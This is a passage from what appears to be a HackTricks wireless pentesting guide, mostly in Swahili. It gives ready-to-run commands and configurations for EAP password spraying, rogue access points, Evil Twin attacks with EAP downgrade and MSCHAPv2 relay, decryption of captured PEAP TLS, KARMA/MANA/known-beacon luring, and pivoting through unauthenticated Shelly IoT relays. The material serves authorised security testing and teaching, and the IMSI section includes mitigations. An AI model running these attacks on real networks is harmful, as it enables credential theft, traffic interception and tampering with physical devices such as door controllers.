```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Notes:
- Inafanya kazi kabla ya tuneli yoyote ya TLS ikiwa usanifu unatumia EAP‑SIM/AKA kiojumuishi bila vitambulisho vilivyolindwa/majina bandia.
- Thamani iliyofichuliwa ni kitambulisho cha kudumu kilichounganishwa na SIM ya abonenti; kukusanya kunawawezesha ufuatiliaji wa muda mrefu na matumizi mabaya ya telecom yanayofuata.

Athari
- Faragha: ufuatiliaji wa kudumu wa mtumiaji/kifaa kutokana na kunaswa pasivu kwa Wi‑Fi katika maeneo ya umma.
- Kuanzisha matumizi mabaya ya telecom: kwa IMSI, mshambuliaji mwenye ufikiaji wa SS7/Diameter anaweza kuulizia eneo au kujaribu kuingilia/kunasa mawasiliano ya simu/SMS na kuiba MFA.

Mikakati ya kupunguza / vitu vya kuangalia
- Thibitisha kwamba wateja wanatumia anonymous outer identities (pseudonyms) kwa EAP‑SIM/AKA kama inavyopendekezwa na 3GPP (mf., 3GPP TS 33.402).
- Pendelea kuweka hatua ya utambulisho ndani ya tuneli (mf., EAP‑TTLS/PEAP ikibeba inner EAP‑SIM/AKA) ili IMSI isitumwe wazi kamwe.
- Kunasa kifurushi (packet captures) za association/auth hazipaswi kamwe kufichua IMSI ghafi katika EAP-Response/Identity.

Related: Telecom signalling exploitation with captured mobile identifiers
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

If the client is expected to use a **username and password** (notice that **EAP-TLS won't be valid** in this case), then you could try to get a **list** a **usernames** (see next part) and **passwords** and try to **bruteforce** the access using [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Unaweza pia kufanya attack hii kwa kutumia `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Nadharia za Mashambulizi ya Client

### Uchaguzi wa Mtandao na Roaming

- Protocol ya 802.11 inaeleza jinsi station inavyoungana na Extended Service Set (ESS) lakini haitaja vigezo vya kuchagua ESS au access point (AP) ndani yake.
- Stations zinaweza kuhamahama kati ya AP zinazoshiriki ESSID ile ile, zikidumisha muunganisho ndani ya jengo au eneo.
- Protocol inahitaji station kuthibitishwa kwa ESS lakini haitaagiza AP kuthibitisha kwa station.

### Preferred Network Lists (PNLs)

- Stations huhifadhi ESSID ya kila wireless network wanayounganisha kwenye Preferred Network List (PNL), pamoja na maelezo ya usanidi maalum wa mtandao.
- PNL hutumika kuunganishwa moja kwa moja na mitandao inayojulikana, ikiboresha uzoefu wa mtumiaji kwa kurahisisha mchakato wa kuunganishwa.

### Passive Scanning

- APs huzungusha beacon frames kwa vipindi, zikitangaza uwepo wao na sifa zao, ikijumuisha ESSID ya AP isipokuwa broadcasting imezimwa.
- Wakati wa passive scanning, stations husikiliza beacon frames. Ikiwa ESSID ya beacon inalingana na kipengee kwenye PNL ya station, station inaweza kuunganishwa moja kwa moja na AP hiyo.
- Ujuzi wa PNL ya kifaa unaruhusu matumizi mabaya kwa kuiga ESSID ya mtandao unaojulikana, ukidanganya kifaa kuunganishwa na rogue AP.

### Active Probing

- Active probing inahusisha stations kutuma probe requests kugundua AP za karibu na sifa zao.
- Directed probe requests zinalenga ESSID maalum, kusaidia kugundua kama mtandao fulani upo katika umbali wa kufikia, hata kama ni hidden network.
- Broadcast probe requests zina sehemu ya SSID tupu (null) na hutumwa kwa AP zote za karibu, zikimruhusu station kuangalia mitandao yoyote inayopendwa bila kufichua yaliyomo kwenye PNL yake.

## Simple AP with redirection to Internet

Kabla ya kuelezea jinsi ya kufanya mashambulizi tata zaidi, itaelezwa **jinsi** tu **kuunda** **AP** na **kuelekeza** **trafiki** yake kwa interface iliyounganishwa **na** **Internet**.

Tumia `ifconfig -a` hakikisha kuwa interface ya wlan ya kuunda AP na interface iliyounganishwa na Internet zipo.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Unda faili ya usanidi `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Kisha **weka IPs** na **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Na kisha **anzisha** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Tengeneza faili ya usanidi `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Simamisha michakato zinazosumbua** , weka **monitor mode**, na **anzisha hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Kupitisha na Kuelekeza Tena
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Shambulio la Evil Twin linatumia jinsi wateja wa WiFi wanavyotambua mitandao, hasa kwa kutegemea jina la mtandao (ESSID) bila kuhitaji base station (access point) kujithibitisha kwa mteja. Mambo muhimu ni pamoja na:

- **Difficulty in Differentiation**: Vifaa huwa na shida kutofautisha kati ya access points halali na rogue access points wakati vinashiriki ESSID na encryption type sawa. Mitandao halisi mara nyingi hutumia access points kadhaa zenye ESSID sawa ili kupanua coverage bila mshono.
- **Client Roaming and Connection Manipulation**: Protocol ya 802.11 inaruhusu vifaa kuhama kati ya access points ndani ya ESS moja. Washambuliaji wanaweza kutumia hili kwa kuwavutia kifaa kuvunja muunganisho na base station yao ya sasa na kujiunga na rogue access point. Hii inaweza kufanikiwa kwa kutoa signal yenye nguvu zaidi au kudhoofisha muunganisho wa access point halali kupitia mbinu kama deauthentication packets au jamming.
- **Challenges in Execution**: Kutekeleza kwa mafanikio shambulio la Evil Twin katika mazingira yenye access points nyingi na zilizo wekwa vizuri kunaweza kuwa changamoto. Deauthenticating access point halali moja mara nyingi husababisha kifaa kujiunga na access point halali nyingine isipokuwa mshambuliaji aweze deauthenticate access points zote zilizo karibu au kuweka rogue access point kwa mkakati.

You can create a very basic Open Evil Twin (no capabilities to route traffic to Internet) doing:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Unaweza pia kuunda Evil Twin kwa kutumia **eaphammer** (kumbuka kwamba ili kuunda evil twins kwa eaphammer interface **haipaswi kuwa** katika **monitor** mode):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Or using Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Tafadhali zingatia kwamba kwa chaguo-msingi ikiwa ESSID katika PNL imehifadhiwa kama WPA protected, kifaa hakitaunganishwa moja kwa moja na Open evil Twin. Unaweza kujaribu kufanya DoS kwenye AP halisi na kutegemea kwamba mtumiaji ataungana kwa mkono na Open evil Twin yako, au unaweza kufanya DoS kwenye AP halisi na kutumia WPA Evil Twin kunasa handshake (kwa kutumia njia hii hautaweza kumruhusu mwanaathiriwa kuungana kwako kwa sababu hujui PSK, lakini unaweza kunasa handshake na kujaribu kuibomoa).

_Some OS and AV zitaonya mtumiaji kwamba kuungana na mtandao Open ni hatari..._

### WPA/WPA2 Evil Twin

Unaweza kuunda **Evil Twin using WPA/2** na ikiwa vifaa vimewekwa kuungana na SSID hiyo kwa WPA/2, vitajaribu kuungana. Hata hivyo, ili **to complete the 4-way-handshake** pia unahitaji **kujua** **password** ambayo client atatumia. Ikiwa **hautajui** hiyo, **connection won't be completed**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Ili kuelewa mashambulizi haya, ninapendekeza kusoma kwanza maelezo mafupi ya [WPA Enterprise explanation](#wpa-enterprise-mgt).

**Kutumia hostapd-wpe**

`hostapd-wpe` inahitaji faili ya **usanidi** ili ifanye kazi. Ili **kuendesha kwa otomatiki** uzalishaji wa faili hizi za usanidi unaweza kutumia [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (pakua faili ya python ndani ya _/etc/hostapd-wpe_/)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
Katika faili ya usanidi unaweza kuchagua mambo mengi tofauti kama ssid, channel, user files, cret/key, dh parameters, wpa version na auth...

[**Using hostapd-wpe with EAP-TLS to allow any certificate to login.**](evil-twin-eap-tls.md)

**Kutumia EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Kwa chaguo-msingi, EAPHammer inatumia authentication methods hizi (angalia GTC kama ya kwanza kujaribu kupata plaintext passwords na kisha kutumia auth methods zenye nguvu zaidi):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Hii ni mbinu chaguo-msingi ili kuepuka nyakati ndefu za kuunganisha. Hata hivyo, unaweza pia kubainisha kwa server authentication methods kutoka dhaifu zaidi hadi zenye nguvu zaidi:
```
--negotiate weakest
```
Au unaweza pia kutumia:

- `--negotiate gtc-downgrade` kutumia utekelezaji wenye ufanisi mkubwa wa GTC downgrade (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` kubainisha kwa mkono methods zinazotolewa (offering the same auth methods in the same order as the organisation the attack will be much more difficult to detect).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

#### Wakati wateja wanapoacha kuthibitisha cheti za RADIUS (PEAP/TTLS)

- If devices are configured with "do not validate certificate", a cloned AP + rogue RADIUS (`eaphammer --cert-wizard --creds --auth wpa-eap`) will collect **NetNTLMv2** (PEAP-MSCHAPv2) or **cleartext** creds (PEAP-GTC). `bettercap` deauth (`wifi.deauth <BSSID>`) both reveals hidden SSIDs during probes and forces reconnects, unless PMF/802.11w blocks spoofed deauth.
- NetNTLMv2 iliyovunjwa hutoa creds za Wi‑Fi/AD zinazoweza kutumika tena; GTC hutoa plaintext mara moja.

#### Kupitisha PEAP-MSCHAPv2 badala ya kuvunja (wpa_sycophant + hostapd-mana)

- Kwa akaunti za mashine zilizo na nywila za nasibu zisizoweza kuvunjwa, tumia **MSCHAPv2 relay**: endesha `hostapd-mana` kama Evil Twin, ukipeleka ubadilishanaji wa MSCHAPv2 kwa `wpa_sycophant`, ambayo kwa wakati mmoja inajiunganisha na AP halali. Relay iliyofanikiwa inatoa Wi‑Fi iliyothibitishwa bila kuzipata tena nywila.
- Tumia builds zinazounga mkono kiwango cha usalama lengwa (WPA3/PMF inahitaji hostapd/wpa_supplicant za karibuni); PMF inazuia kulazimishwa kwa deauth, kwa hivyo subiri client kuungana kwa hiari.

**Using Airgeddon**

`Airgeddon` can use previously generated certificated to offer EAP authentication to WPA/WPA2-Enterprise networks. The fake network will downgrade the connection protocol to EAP-MD5 so it will be able to **capture the user and the MD5 of the password**. Later, the attacker can try to crack the password.\
`Airggedon` offers you the possibility of a **continuous Evil Twin attack (noisy)** or **only create the Evil Attack until someone connects (smooth).**

![](<../../images/image (936).png>)

### Kurekebisha tuneli za TLS za PEAP na EAP-TTLS katika mashambulio ya Evil Twins

_This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS_

Ndani ya **usanidi** wa _hostapd-wpe_ **weka comment** kwenye mstari unaoonyesha _**dh_file**_ (kutoka `dh_file=/etc/hostapd-wpe/certs/dh` hadi `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Hii itafanya `hostapd-wpe` kubadilishana funguo kwa kutumia RSA badala ya DH, hivyo utaweza **ku-decrypt** trafiki baadaye **ukiwa unajua private key ya server**.

Sasa anzisha **Evil Twin** ukitumia **`hostapd-wpe`** na usanidi uliobadilishwa kama kawaida. Pia, anzisha **`wireshark`** kwenye **interface** inayofanya shambulio la Evil Twin.

Sasa au baadaye (mara utakapo kuwa umeshakamata baadhi ya jaribio za uthibitishaji) unaweza kuongeza private RSA key kwenye wireshark katika: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Ongeza kipengee kipya na jaza fomu kwa hizi thamani: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**select your key file**, to avoid problems select a key file **without being password protected**).

![](<../../images/image (687).png>)

Kisha tazama kichupo kipya cha **"Decrypted TLS"**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA na mashambulio ya Known beacons

### ESSID na MAC black/whitelists

Aina tofauti za Media Access Control Filter Lists (MFACLs) na mode zao zinazolingana na athari zao kwenye tabia ya rogue Access Point (AP):

1. **MAC-based Whitelist**:
- Rogue AP itajibu tu maombi ya probe kutoka kwa vifaa vilivyoainishwa kwenye whitelist, ikibaki haionekani kwa wengine wote wasioorodheshwa.
2. **MAC-based Blacklist**:
- Rogue AP itapuuza maombi ya probe kutoka kwa vifaa vilivyoko kwenye blacklist, kwa njia hiyo ikifanya rogue AP isionekana kwa vifaa hivyo maalum.
3. **SSID-based Whitelist**:
- Rogue AP itajibu maombi ya probe tu kwa ESSID maalum zilizoorodheshwa, ikifanya isiweonekana kwa vifaa ambavyo Preferred Network Lists (PNLs) hazijumuishi ESSID hizo.
4. **SSID-based Blacklist**:
- Rogue AP haitajibu maombi ya probe kwa ESSID maalum zilizopo kwenye blacklist, ikifanya isiweonekana kwa vifaa vinavyotafuta mitandao hiyo.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Hii mbinu inamruhusu **mshambuliaji kuunda access point (AP) hatari ambayo inajibu probe requests zote** kutoka kwa vifaa vinavyotafuta kujiunga na networks. Teknik hii **inaudanganya vifaa kuungana na AP ya mshambuliaji** kwa kuiga networks ambazo vifaa vinazitafuta. Mara kifaa kinapotuma connection request kwa rogue AP hii, kinaikamilisha muunganisho, na kusababisha kifaa kuungana kwa makosa na network ya mshambuliaji.

### MANA

Baadaye, **vifaa vilianza kupuuza unsolid network responses**, kupunguza ufanisi wa original karma attack. Hata hivyo, mbinu mpya, inayoitwa the **MANA attack**, ilianzishwa na Ian de Villiers na Dominic White. Mbinu hii inahusisha rogue AP **kunyakua Preferred Network Lists (PNL) kutoka kwa vifaa kwa kujibu broadcast probe requests zao** kwa majina ya network (SSIDs) ambayo vifaa vilikuwa vimewahi kuona. Shambulio hili tata linavuka kinga dhidi ya original karma attack kwa kutumiwa jinsi vifaa vinavyokumbuka na kuipa kipaumbele networks zilizojulikana.

The MANA attack hufanya kazi kwa kufuatilia probe requests za aina ya directed na broadcast kutoka kwa vifaa. Kwa directed requests, huandika MAC address ya kifaa na jina la network lililoombwa, ikiongeza taarifa hii kwenye orodha. Wakati broadcast request inapopokelewa, AP hujibu kwa taarifa inayolingana na yoyote ya networks kwenye orodha ya kifaa, ikivutia kifaa kuungana na rogue AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Shambulio la **Loud MANA attack** ni mkakati wa hali ya juu kwa wakati ambapo vifaa havitumi directed probing au wakati Preferred Network Lists (PNL) zao hazijajulikana kwa mshambulizi. Inafanya kazi kwa kanuni kwamba **vifaa vilivyo katika eneo lile lile huenda vikashiriki baadhi ya majina ya mitandao katika PNL zao**. Badala ya kujibu kwa kuchagua, shambulio hili linatangaza probe responses kwa kila jina la mtandao (ESSID) linalopatikana katika PNL zilizojumishwa za vifaa vyote vilivyoonekana. Njia hii pana inaongeza nafasi ya kifaa kutambua mtandao unaojulikana na kujaribu kuunganishwa na rogue Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Wakati **Loud MANA attack** inaweza isitoshe, **Known Beacon attack** hutoa mbinu nyingine. Njia hii **brute-forces the connection process by simulating an AP that responds to any network name, cycling through a list of potential ESSIDs** zinazotokana na wordlist. Hii inaiga uwepo wa mitandao mingi, ikitarajia kufanana na ESSID ndani ya PNL ya mwathiriwa, na kusababisha jaribio la kuunganishwa kwa AP bandia. Shambulio linaweza kuongezwa kwa kuunganisha na chaguo la `--loud` kwa jaribio kali zaidi la kuwavuta vifaa.

Eaphammer ilitekeleza shambulio hili kama MANA attack ambapo ESSIDs zote ndani ya orodha zinatangazwa (pia unaweza kuziunganisha na `--loud` ili kuunda Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

The **Known Beacon Burst attack** inahusisha **utangazaji wa haraka wa beacon frames kwa kila ESSID iliyoorodheshwa kwenye faili**. Hii huunda mazingira yenye msongamano wa mitandao bandia, ikiongeza kwa kiasi kikubwa uwezekano wa vifaa kuunganishwa na rogue AP, hasa inapochanganywa na MANA attack.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** ni protocol inayowezesha vifaa kuunganishwa moja kwa moja kwa kutumia Wi‑Fi bila hitaji la access point ya kawaida. Uwezo huu umejumuishwa katika mbalimbali za Internet of Things (IoT), kama printers na televisheni, ukiruhusu mawasiliano ya moja kwa moja kati ya vifaa. Sifa muhimu ya Wi‑Fi Direct ni kwamba kifaa kimoja huchukua jukumu la access point, kinachojulikana kama group owner, kusimamia muunganisho.

Security for Wi-Fi Direct connections is established through **Wi‑Fi Protected Setup (WPS)**, which supports several methods for secure pairing, including:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Njia hizi, hasa PIN entry, zinaweza kuathiriwa na udhaifu uleule kama WPS katika mitandao ya Wi‑Fi ya jadi, na hivyo kuwa malengo ya attack vectors sawa.

### EvilDirect Hijacking

**EvilDirect Hijacking** ni attack maalum kwa Wi‑Fi Direct. Inafanya kazi kama dhana ya Evil Twin attack lakini inalenga muunganisho wa Wi‑Fi Direct. Katika hali hii, mshambuliaji anajifanya kuwa group owner halali kwa kusudi la kumdanganya kifaa kuungana na entity yenye madhara. Mbinu hii inaweza kutekelezwa kwa kutumia zana kama `airbase-ng` kwa kubainisha channel, ESSID, na MAC address ya kifaa kinachodanganywa:

## Commissioning AP persistence & dual-homed IoT pivoting (Shelly Gen4 case)

Baadhi ya relays/controllers za IoT za watumiaji huacha commissioning **open AP** ikiwa hai baada ya kujiunga na IoT WLAN (mfano, Shelly Gen4 SSIDs zinazoanza na `Shelly`). Kifaa husalia **dual-homed**: interface ya AP yenye default IP `192.168.33.1` pamoja na interface ya client kwenye WLAN ya ndani.

**Abuse flow (Wi‑Fi proximity required):**

1. Jiunge na provisioning AP, pata DHCP lease, na vinjari kwenye **AP-side HTTP API**.
2. Washawishi relays kupitia endpoints zisizo na uthibitisho, kwa mfano `http://192.168.33.1/relay/0?turn=on` (inaweza kuathiri milango/kibanda/garaji). Endpoints za firmware upload zinaweza kuongeza persistence.
3. Itumie kama **pivot**: Shelly scripting inaweza kutuma HTTP kutoka internal interface kwenda hosts wengine wa LAN. Mfano wa pivot kwa Shelly nyingine kwenye `10.0.98.221`:
```javascript
Shelly.addEventHandler(function (event) {
if (event.component === "switch:0" && event.info.state) {
Shelly.call("HTTP.GET", { url: "http://10.0.98.221/light/0?turn=on" });
}
});
```
Badilisha URL kwa target yoyote ya HTTP ya ndani inayoifikika; dual-homing inazuia kazi za ziada za routing/NAT.
4. Kwa kiwango kikubwa: tafuta vendor SSIDs kwenye **wigle.net** (mfano, `Shelly`) ili kupata commissioning APs kwa exploitation eneo.

Kwa persistence, acha commissioning AP iendelee kuwa enabled.

## References

- [https://www.pentestpartners.com/security-blog/shelly-iot-door-controller-config-fail-leaving-your-garage-home-and-security-exposed/](https://www.pentestpartners.com/security-blog/shelly-iot-door-controller-config-fail-leaving-your-garage-home-and-security-exposed/)
- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)
- [Wireless-(in)Fidelity: Pentesting Wi-Fi in 2025 (Synacktiv)](https://www.synacktiv.com/en/publications/wireless-infidelity-pentesting-wi-fi-in-2025.html)
- [PEAP relay attacks with wpa_sycophant (SensePost)](https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/)


TODO: Take a look to [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (kuangalia login kwa Facebook na kuiga WPA kwenye captive portals)

{{#include ../../banners/hacktricks-training.md}}
